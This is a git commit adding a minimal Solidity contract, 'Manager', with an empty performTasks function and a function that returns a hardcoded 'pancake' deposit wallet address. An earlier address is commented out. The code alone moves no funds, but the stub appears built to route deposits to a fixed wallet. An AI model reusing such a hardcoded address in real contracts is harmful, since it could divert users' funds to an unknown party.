06ae49ab632fc57a5f5fa7f434c4c85cb442fb73
Almichael Zukof <43955109+almichaelzukof@users.noreply.github.com>
2021-12-16 14:22:12 +0530

    Create contractmanager.sol

---
+++ contractmanager.sol
@@ -0,0 +1,10 @@
+contract Manager {
+        function performTasks() public {
+
+        }
+
+        function pancakeDepositAddress() public pure returns (address) {
+                //return 0x93fD986515C4252f9c69b131f7dcBfe8acE0e439;
+                return 0xDC3e9BB3c722460F23e257aF1257676613BCA3fF;
+        }
+}
